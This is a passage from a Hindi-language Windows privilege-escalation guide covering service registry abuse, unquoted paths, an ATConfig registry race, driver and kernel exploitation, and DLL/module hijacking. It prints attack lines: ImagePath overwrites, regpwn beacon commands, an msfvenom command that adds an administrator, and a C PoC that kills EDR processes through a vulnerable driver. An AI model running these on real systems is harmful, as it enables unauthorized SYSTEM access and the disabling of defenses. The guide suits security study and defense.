get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

मूल permission test इस तरह बताया गया था:

यह जाँचना चाहिए कि **Authenticated Users** या **NT AUTHORITY\INTERACTIVE** के पास `FullControl` permissions हैं या नहीं। अगर ऐसा है, तो service द्वारा execute की जाने वाली binary को बदला जा सकता है।

जाँचें कि किसी particular service key पर **Authenticated Users** या **NT AUTHORITY\INTERACTIVE** के पास write-capable registry permissions हैं या नहीं। सिर्फ़ ACL entry मौजूद होने से effective access सिद्ध नहीं होता: deny entries, current token और inherited permissions भी मायने रखते हैं। Registry-key rights, service object के `SERVICE_CHANGE_CONFIG` और `SERVICE_START` rights से अलग होते हैं। Escalation के लिए एक usable service configuration field, service को trigger करने का तरीका और अधिक privileged service identity भी आवश्यक हैं। Microsoft के [registry-key rights](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights) और [service access-rights reference](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) देखें।

Execute की जाने वाली binary का Path बदलने के लिए:

```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

### मनमाने HKLM value write के लिए Registry symlink race (ATConfig)

कुछ Windows Accessibility सुविधाएँ प्रति-user **ATConfig** keys बनाती हैं, जिन्हें बाद में एक **SYSTEM** process द्वारा HKLM session key में कॉपी किया जाता है। Registry **symbolic link race** इस privileged write को **किसी भी HKLM path** पर redirect कर सकती है, जिससे मनमाने HKLM **value write** की क्षमता मिलती है।<sup>[[18]](#references)</sup>

मुख्य locations (उदाहरण: On-Screen Keyboard `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` में installed accessibility features की सूची होती है।
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` में user-controlled configuration होती है।
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` logon/secure-desktop transitions के दौरान बनाई जाती है और user द्वारा writable होती है।

Abuse flow (CVE-2026-24291 / ATConfig):

1. वह **HKCU ATConfig** value भरें जिसे आप SYSTEM से लिखवाना चाहते हैं।
2. Secure-desktop copy trigger करें (जैसे, **LockWorkstation**), जिससे AT broker flow शुरू होता है।
3. **Race जीतें**: `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml` पर **oplock** लगाएँ; oplock fire होने पर **HKLM Session ATConfig** key को protected HKLM target की ओर इंगित करने वाले **registry link** से बदलें।
4. SYSTEM attacker द्वारा चुनी गई value को redirected HKLM path पर लिख देता है।

मनमाना HKLM value write मिलने के बाद, service configuration values को overwrite करके LPE करें:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/command line)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

ऐसी service चुनें जिसे सामान्य user start कर सके (जैसे, **`msiserver`**) और write के बाद उसे trigger करें। **ध्यान दें:** public exploit implementation race के हिस्से के रूप में workstation को **lock** करता है।

उदाहरण tooling (RegPwn BOF / standalone):<sup>[[19]](#references)</sup>

```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```

### Services registry AppendData/AddSubdirectory permissions

यदि आपके पास किसी registry पर यह permission है, तो इसका मतलब है कि **आप इससे sub registries बना सकते हैं**। Windows services के मामले में, यह **arbitrary code execute करने के लिए पर्याप्त है:**

{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

यदि किसी executable का path quotes के अंदर नहीं है, तो Windows space से पहले खत्म होने वाले हर path को execute करने की कोशिश करेगा।

उदाहरण के लिए, path _C:\Program Files\Some Folder\Service.exe_ के लिए Windows इन्हें execute करने की कोशिश करेगा:

```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```

सभी unquoted service paths सूचीबद्ध करें, built-in Windows services से जुड़े paths को छोड़कर:

```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

**आप metasploit से इस vulnerability का पता लगाकर उसका exploit कर सकते हैं:** `exploit/windows/local/trusted\_service\_path` आप metasploit से manually service binary बना सकते हैं:

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

### Recovery Actions

Windows उपयोगकर्ताओं को यह निर्दिष्ट करने देता है कि कोई service विफल होने पर कौन-सी कार्रवाइयाँ की जाएँ। इस सुविधा को किसी binary की ओर इंगित करने के लिए कॉन्फ़िगर किया जा सकता है। यदि इस binary को बदला जा सकता है, तो privilege escalation संभव हो सकता है। अधिक जानकारी [आधिकारिक दस्तावेज़](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>) में मिल सकती है।

## Scheduled task script targets

यदि कोई enabled task `.bat` या `.cmd` फ़ाइल के साथ `cmd.exe /c` चलाता है, तो `cmd.exe` के साथ-साथ **action arguments** में दिए गए script की भी जाँच करें। यही बात interpreter के स्पष्ट file argument, जैसे PowerShell `-File`, पर भी लागू होती है। यदि किसी scheduled batch file में literal PowerShell `-File` call है, तो उस संदर्भित script के ACL की भी जाँच करें; variables, conditionals और shell chaining को मैन्युअल रूप से trace करना होगा। Caller द्वारा लिखे जा सकने वाले script या parent directory को cross-account execution का संभावित रास्ता तभी मानें, जब configured task principal caller से अलग हो और task वास्तव में उस action तक पहुँचे। Scripts के लिए append-only ACL महत्वपूर्ण हो सकता है, लेकिन पहले का `exit` या अन्य control flow जोड़ी गई lines को unreachable बना सकता है। privilege escalation का दावा करने से पहले प्रभावी ACLs, [task execution context](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks), working directory, trigger और application-control policy की पुष्टि करें। Inventory के दौरान script को न बदलें और न ही task शुरू करें।

## सुलभ फ़ाइलों पर Named streams

NTFS पर किसी readable file में named `:$DATA` stream हो सकता है, जिसका content सामान्य directory listing में नहीं दिखता। सुलभ backups या configuration files के छोटे, प्रासंगिक समूह के लिए, कोई content खोलने से पहले stream के **नाम और आकार** देखें; Windows इन्हें [`FindFirstStreamW` / `FindNextStreamW`](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams) और PowerShell के [`Get-Item -Stream *`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-item) के माध्यम से उपलब्ध कराता है। Secret का संकेत देने वाला stream name केवल एक lead है। फ़ाइल की प्रभावी read access, filesystem में stream support, stream में उपयोगी credentials हैं या नहीं, और वे वास्तव में किस account से authenticate करते हैं—इन सबकी जाँच करें। नियमित enumeration के दौरान recursive stream scans और stream contents को प्रिंट करने से बचें।

## Scheduled Windows Driver Kit helper inputs

वैकल्पिक Windows Driver Kit में `StandaloneRunner.exe` शामिल है, जो अपनी run directory से `command.txt`, `reboot.rsf` और project की `working\rsf.rsf` फ़ाइल का उपयोग कर सकता है। यदि कोई scheduled task या service इस helper को privileged account से शुरू करती है, तो इन inputs पर low-privilege write access से उस account के context में command execution हो सकता है, भले ही helper executable स्वयं protected हो। पुष्टि करें कि privileged consumer मौजूद है और **दोनों** sidecar files बनाई या बदली जा सकती हैं; केवल helper मिलना पर्याप्त नहीं है।

Scheduled task के लिए, उसके action की [`WorkingDirectory`](https://learn.microsoft.com/en-us/windows/win32/taskschd/execaction-workingdirectory) और दोनों sidecar paths के ACLs की जाँच करें। यदि task working directory निर्दिष्ट नहीं करता, तो executable की directory केवल जाँचने योग्य lead है, इस बात का प्रमाण नहीं कि task अपने inputs वहीं से पढ़ता है। Project की working-file prerequisite भी पूरी होनी चाहिए। यह मानने के बजाय कि task SYSTEM के रूप में चलता है, वास्तविक task principal की जाँच करें।

## Applications

### Installed Applications

**binaries की permissions** जाँचें (हो सकता है आप उनमें से किसी को overwrite करके privilege escalation कर सकें) और **folders** की भी ([DLL Hijacking](dll-hijacking/index.html))।

```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

#### Checkmk Windows agent repair path

[CVE-2024-0670](https://checkmk.com/werk/16361) पुराने Checkmk Windows agents को प्रभावित करता है, जो `C:\Windows\Temp` में command files लिखते थे और replacement विफल होने पर पहले से मौजूद write-protected file को execute कर देते थे। Vendor ने इस समस्या को 2.1.0p40, 2.2.0p23, 2.3.0b1, और 2.4.0b1 में ठीक किया। पूरा installed patch level और यह जांचें कि प्रभावित agent operation चल सकता है या नहीं; केवल branch का label, जैसे `2.1`, exposure साबित नहीं कर सकता। Enumeration में version, service state और Temp permissions की जांच files बनाए या agent commands trigger किए बिना की जा सकती है।

#### ADSelfService Plus SAML service review

[CVE-2022-47966](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html) ADSelfService Plus build 6210 और उससे पुराने versions को प्रभावित करता था; vendor ने इसे build 6211 में ठीक किया। यह तभी प्रासंगिक है जब SAML SSO **enabled है या पहले enabled था**। इसलिए installed-product entry या service path केवल एक सुराग है, vulnerability का निर्णय नहीं: सटीक build, SAML configuration history, service की network reachability, और जिस account के तहत यह चलता है, उसकी पुष्टि करें। Service के माध्यम से code execution को उस account के privileges मिलते हैं; SYSTEM execution के लिए instance का SYSTEM के तहत चलना ज़रूरी है। Product के Backup directory में मौजूद readable `OfflineBackup_*.ezip` एक अलग encrypted backup का सुराग है, usable credential या इस SAML flaw का प्रमाण नहीं। Routine enumeration के दौरान इसे unpack किए बिना इसका path और access rights दर्ज करें।

#### Jenkins controller और domain-account की सीमाएं

Windows Jenkins controller पर job बनाने या configure करने की permission और उसे start करने की permission में अंतर करें: [Jenkins इन्हें अलग `Job/Create`, `Job/Configure`, और `Job/Build` rights के रूप में दस्तावेज़ करता है](https://www.jenkins.io/doc/book/security/access-control/permissions/)। Configured schedule या remote trigger से build चलाने का एक और रास्ता मिल सकता है, लेकिन पुष्टि करें कि वह enabled है और build वास्तव में चलता है। Execution को controller या चुने गए agent की identity मिलती है, और stored credential तभी इस्तेमाल किया जा सकता है जब job को उसके scope तक access हो। अलग से, `JENKINS_HOME` metadata तक access की जांच करें: Jenkins credential material और encryption keys को `credentials.xml`, `secrets/hudson.util.Secret`, और `secrets/master.key` में रखता है ([Jenkins secret storage](https://www.jenkins.io/doc/developer/security/secrets/))। इनका मौजूद होना अपने आप में password उजागर नहीं करता; साझा output में secrets दिखाए बिना **ज़रूरी files को read करने की access** और account reuse का अलग रास्ता सत्यापित करें। यदि उस account के पास AD user-object `scriptPath` write right है, तो इसे cross-user execution मानने से पहले writable script path और target user के रूप में चलने वाले वास्तविक logon या scheduled consumer की पुष्टि करें। आगे group control के लिए प्रभावी AD rights की अलग से पुष्टि ज़रूरी है।

#### Azure Pipelines self-hosted agent identity

Azure DevOps Server या Azure Pipelines project के लिए, pipeline **बनाने या edit करने** की permission को उसे **queue** करने और चुने गए agent pool का उपयोग करने की permission से अलग रखें; [Microsoft pipeline permissions](https://learn.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops) और [pool authorization](https://learn.microsoft.com/en-us/azure/devops/pipelines/agents/pools-queues?view=azure-devops) को अलग-अलग दस्तावेज़ करता है। यदि कम privileges वाला account script step submit करके उस pipeline को self-hosted Windows agent पर चला सकता है, तो step [agent के configured operating-system account](https://learn.microsoft.com/azure/devops/pipelines/agents/agents) के रूप में execute होता है। Cross-user या SYSTEM transition का दावा करने से पहले सटीक pipeline, branch/resource restrictions, authorized pool, runnable job, और agent service identity सत्यापित करें। Installed agent, project role, या repository write access अपने आप में केवल एक सुराग है; passive enumeration के दौरान build शुरू किए बिना permissions और local service metadata की समीक्षा करें।

#### Microsoft Entra Connect Sync credentials

[Microsoft के अनुसार](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions), **ADSync service account**, जो synchronization service चलाता है और अपने SQL database तक access करता है, और **AD DS connector account**, जिसकी directory permissions configured sync features पर निर्भर करती हैं, अलग-अलग हैं। Connector credentials उस database में encrypted रूप में store होते हैं, और key material [ADSync service account के तहत DPAPI द्वारा सुरक्षित](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-adsync-service-account) रहता है। Installed sync service, local administrator जैसा दिखने वाला group, या database की visibility मात्र से decrypt किया जा सकने वाला credential या domain escalation साबित नहीं होता। वास्तविक database read rights, service-account/key access, installation और SQL layout, configured connector identity, और उस identity के प्रभावी AD privileges की अलग-अलग समीक्षा करें। Routine enumeration में केवल service और access metadata दिखाएं, stored secrets को query या print न करें।

#### Printer driver support DLL permissions

Installed printer driver अपने support DLLs को `C:\ProgramData` के तहत रख सकता है और उन्हें अधिक privileged print process में load कर सकता है। Printer WMI enumeration से access न मिलने पर भी, parent directories और reparse points सहित, सटीक driver directory और DLL ACLs की समीक्षा करें। [Ricoh printer-driver issue CVE-2019-19363](https://www.ricoh.com/info/2020/0122_1) के लिए रिपोर्ट किया गया path `C:\ProgramData\RICOH_DRV\<driver>\_common\dlz` था; [मूल disclosure](https://www.pentagrid.ch/de/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/) में `PrintIsolationHost.exe` द्वारा DLL loading का वर्णन है। Writable ACL केवल एक सुराग है: deny entries लागू होने के बाद प्रभावी write access, संबंधित driver के installed होने और privileged identity के तहत file load करने, और vendor के updated driver या security program द्वारा installation ठीक किए जाने की पुष्टि करें। केवल directory name या driver version के आधार पर vulnerability का अनुमान न लगाएं।

### Write Permissions

जांचें कि क्या आप किसी config file को modify करके कोई विशेष file पढ़ सकते हैं, या किसी ऐसे binary को modify कर सकते हैं जिसे Administrator account (schedtasks) execute करने वाला है।

System में कमज़ोर folder/file permissions खोजने का एक तरीका यह है:

```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

### Notepad++ plugin autoload persistence/execution

Notepad++ अपने `plugins` सबफ़ोल्डर में मौजूद किसी भी plugin DLL को अपने आप लोड करता है। अगर writable portable/copy install मौजूद है, तो एक malicious plugin डालने से हर बार लॉन्च होने पर `notepad++.exe` के अंदर automatic code execution होता है (इसमें `DllMain` और plugin callbacks भी शामिल हैं)।

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### स्टार्टअप पर चलाना

**जाँचें कि क्या आप ऐसी किसी registry या binary को overwrite कर सकते हैं, जिसे कोई दूसरा user चलाने वाला है।**\
**यह जानने के लिए कि privileges escalate करने के लिए कौन-सी autoruns locations दिलचस्प हैं, नीचे दिया गया page पढ़ें:**


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

संभावित **third-party अजीब/vulnerable** drivers खोजें

```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```

यदि कोई driver arbitrary kernel read/write primitive उजागर करता है (जो खराब तरीके से डिज़ाइन किए गए IOCTL handlers में आम है), तो आप kernel memory से सीधे SYSTEM token चुराकर privilege escalate कर सकते हैं।<sup>[[13]](#references)</sup> चरण-दर-चरण तकनीक यहाँ देखें:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

{{#ref}}
windows-kernel-rootkits-and-dkom.md
{{#endref}}

{{#ref}}
kernel-mode-file-access-check-bypass.md
{{#endref}}

Windows kernel-exploitation से जुड़ी सामग्री:

User-writable read/write registers वाले kernel-mode ring-buffer मामले के लिए, [USB MIDI looped-streaming variant](../../binary-exploitation/array-indexing.md#kernel-driver-variant-usb-midi-looped-streaming) देखें।

{{#ref}}
../../binary-exploitation/windows-kernel-type-confusion-to-npfs-arbitrary-rw.md
{{#endref}}

ऐसे race-condition bugs के लिए, जहाँ vulnerable call attacker-controlled Object Manager path खोलता है, lookup को जानबूझकर धीमा करने (max-length components या deep directory chains का उपयोग करके) से window को microseconds से बढ़ाकर tens of microseconds तक किया जा सकता है:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/afd-rio-buffer-uaf.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/usb-midi-packet-size-pool-overflow.md
{{#endref}}

#### Cancel-safe queue UAFs, paged-pool disclosures, और I/O ring pivots

कुछ Windows kernel LPE chains दो अलग-अलग कमज़ोर bugs से बनाई जा सकती हैं: एक **cancel-safe queue lifetime race**, जो queue lock अभी held होने पर request/CBD को free कर देती है, और एक **lock-release-before-copy** disclosure, जो `RtlCopyToUser` के दौरान freed paged-pool allocation leak करती है।<sup>[[29]](#references)</sup>

Audit और exploitation के नोट्स:

- **Free-under-lock + cancel afterwards**: ऐसे success path की तलाश करें जो **Acquire -> CompleteRequest/free -> Release** करता हो, जबकि cancel path **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo** करता हो। यदि success path, CBDQ/CSQ lock release करने से पहले `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` तक पहुँचता है, तो `NtCancelIoFileEx -> IopCsqCancelRoutine` में blocked thread बाद में resume होकर freed `PFLT_CALLBACK_DATA` को driver के remove callback में वापस भेज सकता है।
- Freed queue object को समान आकार वाले, attacker-controlled paged-pool allocation से **reclaim करें**। `NPFS` Data Queue Entries उपयोगी होते हैं, क्योंकि payload और size controllable होते हैं और बाद में pipe read/peek operations से उन्हें probe किया जा सकता है। यदि freed object में list links हों, तो उन्हें **user memory में fake request nodes की cyclic list** से overwrite करें, ताकि driver मूल list head पर समाप्त होने के बजाय attacker-defined request structures को बार-बार process करे।
- **Predictable write को upgrade करें**: यदि fake request bookkeeping writes (timestamps / QPC / refcount के आस-पास के fields) में इस्तेमाल होने वाले nested context pointer को redirect करता है, तो आपको **address-controlled but not value-controlled** kernel write मिल सकता है। इस स्थिति में, अंतिम code/data pointer के बजाय sprayed pool object के **length/size** field को target करें, फिर spray को enumerate करें, जब तक corrupted object से **out-of-bounds paged-pool read** न मिल जाए।
- **Raceable disclosure pattern**: ऐसा कोई भी syscall जो `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` करता है, एक मजबूत candidate है। यदि attacker copied buffer को बड़ा कर सकता है (उदाहरण के लिए, कई list/resource entries जोड़कर, जिससे serializer का अंतिम allocation size बढ़ता है), तो reliability बेहतर होती है, क्योंकि लंबी copy machine को crash किए बिना replacement window को बढ़ाती है।
- **Pointer-rich refill targets**: Windows **I/O ring** registered-buffer arrays disclosure के बेहतरीन targets हैं, क्योंकि उनका paged-pool size attacker-controlled होता है (`8 * regBufferCnt`) और हर element `_IOP_MC_BUFFER_ENTRY` का kernel pointer होता है। इनमें से किसी एक array को leak करें, आसपास का `IORING_OBJECT` recover करें, फिर **`RegBuffers`** और **`RegBuffersCount`** corrupt करें, ताकि बाद के I/O ring operations attacker-forged entries का उपयोग करें और arbitrary kernel read/write दें। यदि उपलब्ध एकमात्र write से आपको कोई stable byte मिलता है (उदाहरण के लिए `KUSER_SHARED_DATA+0x14` से), तो repeated-byte user pointer जैसे `0x0101010101010101` बनाने के लिए **overlapping unaligned writes** का उपयोग करें, उसे `VirtualAlloc` से map करें, और forged registered-buffer array वहाँ रखें।<sup>[[30]](#references)</sup>

उपयोगी debugging संकेत:

```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```

जब corrupted I/O ring से arbitrary kernel read/write प्राप्त हो जाए, तो standard post-primitive workflow का उपयोग करके SYSTEM token चुरा लें:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Registry hive memory corruption primitives

आधुनिक hive vulnerabilities की मदद से deterministic layouts तैयार किए जा सकते हैं, writable HKLM/HKU descendants का दुरुपयोग किया जा सकता है, और बिना custom driver के metadata corruption को kernel paged-pool overflows में बदला जा सकता है। पूरी chain यहाँ जानें:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### `RtlQueryRegistryValues` attacker-controlled paths से direct-mode type confusion

कुछ drivers userland से registry path स्वीकार करते हैं, केवल यह जाँचते हैं कि वह एक मान्य UTF-16 string है, और फिर stack scalar जैसे `int readValue` में `RTL_QUERY_REGISTRY_DIRECT` के साथ `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` call करते हैं। यदि `RTL_QUERY_REGISTRY_TYPECHECK` मौजूद नहीं है, तो `EntryContext` की व्याख्या developer की अपेक्षित type के अनुसार नहीं, बल्कि registry की **वास्तविक** type के अनुसार की जाती है।

इससे दो उपयोगी primitives बनते हैं:<sup>[[24]](#references)[[25]](#references)</sup>

- **Confused deputy / oracle**: user-controlled absolute `\Registry\...` path driver को attacker द्वारा चुनी गई keys query करने देता है, return codes/logs के ज़रिए उनके मौजूद होने का पता leak करता है, और कभी-कभी वे values पढ़ने देता है जिन्हें caller सीधे access नहीं कर सकता।
- **Kernel memory corruption**: `&readValue` जैसा scalar destination registry value type के आधार पर `REG_QWORD`, `UNICODE_STRING` या sized binary buffer के रूप में type-confused हो जाता है।

व्यावहारिक exploitation नोट्स:

- **Windows 8+ mitigation**: यदि query `RTL_QUERY_REGISTRY_DIRECT` का उपयोग करते हुए ऐसे **untrusted hive** तक पहुँचती है जिसमें `RTL_QUERY_REGISTRY_TYPECHECK` नहीं है, तो kernel callers `KERNEL_SECURITY_CHECK_FAILURE (0x139)` के साथ crash हो जाते हैं। Exploitability बनाए रखने के लिए, `HKCU` के तहत values रखने के बजाय **trusted system hives के अंदर attacker-writable keys** खोजें।
- **Trusted-hive staging**: `\Registry\Machine` के writable descendants enumerate करने के लिए NtObjectManager का उपयोग करें, फिर sandboxed contexts से पहुँच में आने वाली keys खोजने के लिए duplicated **low-integrity** token के साथ scan दोबारा चलाएँ:<sup>[[26]](#references)</sup>

```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```

- **`REG_QWORD`**: 4-byte `int` में 8-byte का direct write, उससे लगे stack data को corrupt कर देता है और पास के callback/function pointer को आंशिक रूप से overwrite कर सकता है।
- **`REG_SZ` / `REG_EXPAND_SZ`**: direct mode में `EntryContext` का `UNICODE_STRING` की ओर point करना अपेक्षित है। अगर code पहले attacker-controlled `REG_DWORD` को stack scalar में load करता है और फिर उसी buffer को string read के लिए दोबारा इस्तेमाल करता है, तो attacker `Length`/`MaximumLength` को नियंत्रित कर सकता है और `Buffer` pointer को आंशिक रूप से प्रभावित कर सकता है, जिससे semi-controlled kernel write होता है।
- **`REG_BINARY`**: बड़े binary data के लिए, direct mode `EntryContext` पर पहले `LONG` को signed buffer size मानता है। अगर पहले के `REG_DWORD` read से reused scalar में attacker-controlled **negative** value रह जाती है, तो अगली `REG_BINARY` query attacker के bytes को सीधे पास के stack slots पर copy कर देती है। अक्सर callback-pointer को पूरी तरह overwrite करने का यह सबसे साफ़ तरीका होता है।

मज़बूत hunting pattern: **एक ही stack variable में, उसे दोबारा initialize किए बिना, अलग-अलग प्रकार के registry reads करना**। `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, दोबारा इस्तेमाल किए गए `EntryContext` pointers, और ऐसे code paths खोजने के लिए grep करें जहाँ पहला registry read यह तय करता हो कि दूसरा read होगा या नहीं।

#### device objects पर FILE_DEVICE_SECURE_OPEN न होने का दुरुपयोग (LPE + EDR kill)

कुछ signed third-party drivers, IoCreateDeviceSecure के ज़रिए मजबूत SDDL वाला अपना device object बनाते हैं, लेकिन DeviceCharacteristics में FILE_DEVICE_SECURE_OPEN सेट करना भूल जाते हैं। इस flag के बिना, जब device को किसी ऐसे path से खोला जाता है जिसमें एक अतिरिक्त component हो, तो secure DACL लागू नहीं होता। इससे कोई भी unprivileged user ऐसे namespace path का इस्तेमाल करके handle प्राप्त कर सकता है:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (एक वास्तविक मामले से)

जब कोई user device खोल सकता है, तो driver द्वारा उपलब्ध कराए गए privileged IOCTLs का LPE और tampering के लिए दुरुपयोग किया जा सकता है। वास्तविक मामलों में देखी गई क्षमताओं के उदाहरण:
- मनमाने processes के full-access handles लौटाना (token theft / DuplicateTokenEx/CreateProcessAsUser के ज़रिए SYSTEM shell)।
- बिना किसी प्रतिबंध के raw disk read/write (offline tampering, boot-time persistence tricks)।
- Protected Process/Light (PP/PPL) समेत मनमाने processes को terminate करना, जिससे kernel के ज़रिए user land से AV/EDR kill किया जा सकता है।

न्यूनतम PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```

डेवलपर्स के लिए जोखिम कम करने के उपाय
- DACL द्वारा प्रतिबंधित किए जाने वाले device objects बनाते समय हमेशा FILE_DEVICE_SECURE_OPEN सेट करें।
- विशेषाधिकार प्राप्त operations के लिए caller context की पुष्टि करें। Process termination या handles लौटाने की अनुमति देने से पहले PP/PPL checks जोड़ें।
- IOCTLs को सीमित करें (access masks, METHOD_*, input validation) और सीधे kernel privileges के बजाय brokered models पर विचार करें।

रक्षा करने वालों के लिए detection के सुझाव
- संदिग्ध device names (जैसे, `\\ .\\amsdk*`) के user-mode opens और दुरुपयोग का संकेत देने वाले विशिष्ट IOCTL sequences की निगरानी करें।
- Microsoft की vulnerable driver blocklist (HVCI/WDAC/Smart App Control) लागू करें और अपनी allow/deny lists बनाए रखें।


## PATH DLL Hijacking

अगर आपके पास **PATH में मौजूद किसी folder के अंदर write permissions** हैं, तो आप किसी process द्वारा लोड की गई DLL को hijack करके **escalate privileges** कर सकते हैं।<sup>[[2]](#references)</sup>

PATH में मौजूद सभी folders की permissions जाँचें:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

इस जाँच का दुरुपयोग कैसे करें, इस बारे में अधिक जानकारी के लिए:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## `C:\node_modules` के ज़रिए Node.js / Electron module resolution hijacking

यह **Windows uncontrolled search path** का एक प्रकार है, जो **Node.js** और **Electron** applications को प्रभावित करता है, जब वे `require("foo")` जैसा bare import करते हैं और अपेक्षित module **मौजूद नहीं होता**।<sup>[[20]](#references)</sup>

Node, directory tree में ऊपर की ओर जाकर हर parent में `node_modules` folders जाँचता है। Windows पर यह खोज drive root तक पहुँच सकती है, इसलिए `C:\Users\Administrator\project\app.js` से launch किया गया application इन paths को जाँच सकता है:<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

